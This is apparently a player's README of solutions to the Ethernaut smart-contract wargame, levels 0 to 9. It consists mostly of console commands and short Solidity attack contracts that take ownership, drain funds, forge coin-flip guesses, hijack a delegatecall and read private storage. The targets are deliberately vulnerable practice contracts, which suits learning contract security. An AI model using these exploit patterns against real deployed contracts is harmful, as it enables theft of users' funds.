# Ethernaut

The Ethernaut is a Web3/Solidity based wargame inspired on overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.
Here are my solutions for each level.

## 0.Hello Ethernaut

```
> contract.info()
< [[PromiseResult]]: "You will find what you need in info1()."

> contract.info1()
< [[PromiseResult]]: "Try info2(), but with \"hello\" as a parameter."

> contract.info2("hello")
< [[PromiseResult]]: "The property infoNum holds the number of the next info method to call."

> contract.abi

> let x = await contract.infoNum()

> x.toString()
< '42'

> contract.info42()
< [[PromiseResult]]: "theMethodName is the name of the next method."

> contract.theMethodName()
< [[PromiseResult]]: "The method name is method7123949."

> contract.method7123949()
< [[PromiseResult]]: "If you know the password, submit it to authenticate()."

> contract.password()
< [[PromiseResult]]: "ethernaut0"

> contract.authenticate("ethernaut0")
```

Submit the instance by clicking the orange button.

```(-(-_(-_-)_-)-) Well done, You have completed this level!!!```

## 1. Fallback
```
> contract.contribute({value:toWei("0.0001", "ether")})

> web3.eth.sendTransaction({to:"0x3D585bb9145ca9101D5EdA79E138D854242FF90C", 
	value:toWei("0.0001", "ether"), from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"})
	
> contract.owner()
< [[PromiseResult]]: "0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"

> contract.withdraw()

> getBalance("0x3D585bb9145ca9101D5EdA79E138D854242FF90C")
< [[PromiseResult]]: "0"
```

Submit the instance by clicking the orange button.

```\,,/(◣_◢)\,,/ Well done, You have completed this level!!!```

## 2. Fallout
```
> contract.Fal1out()
```
Submit Instance

```☜Ҩ.¬_¬.Ҩ☞ Well done, You have completed this level!!!```

## 3. CoinFLip

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract Win {
    
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public coinflip;
    constructor(address conFlipAddress) public {
        coinflip = CoinFlip(conFlipAddress);
    }
    // address public coinflip_add = 0x0Fd8F81a893762013486d74b6b61fA0704d07D4b;
    
    function _guess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }
}
```
Copy the Coin Flip contract into CoinFlip.sol and deploy win.sol. Call _guess() 10 times.

> contract.consecutiveWins()

## 4. Telephone 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Hack {
    Telephone public tele;

    constructor(address tele_add) public {
        tele = Telephone(tele_add);
    }

    function change_owner(address _owner) public {
        tele.changeOwner(_owner);
    }
}

```
```
ʕ•̫͡•ʕ*̫͡*ʕ•͓͡•ʔ-̫͡-ʕ•̫͡•ʔ*̫͡*ʔ-̫͡-ʔ Well done, You have completed this level!!!
```

## 5. Token

> contract.transfer("Instance address",21)

Submit the instance 
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```

## 6. Delegation
```
> await web3.eth.abi.encodeFunctionSignature("pwn()")
< '0xdd365b8b'

> await web3.eth.sendTransaction({from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0",
 data:"0xdd365b8b", to:"0xD59491bF35887E4A36Fb197EB5739A02f03d4516"})
 
```
Submit instance 
``` ✌(◕‿-)✌ Well done, You have completed this level!!! ```

## 7. Force 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    
    function destruct(address payable _victim) public payable {
        selfdestruct(_victim);
    }

    receive() external payable {}
}
```
## 8. Vault 

```
> await web3.eth.getStorageAt("0x07D54ae8430aD22D17D499450BcA6D6b1E3E8Fe1", 1);
> await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

```

## 9. King

Create a new contract: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    
    constructor (address contrac) public payable {
        contrac.call{ value: msg.value }("");
    }
    
}
```
Send >0.001 ETH while deploying.






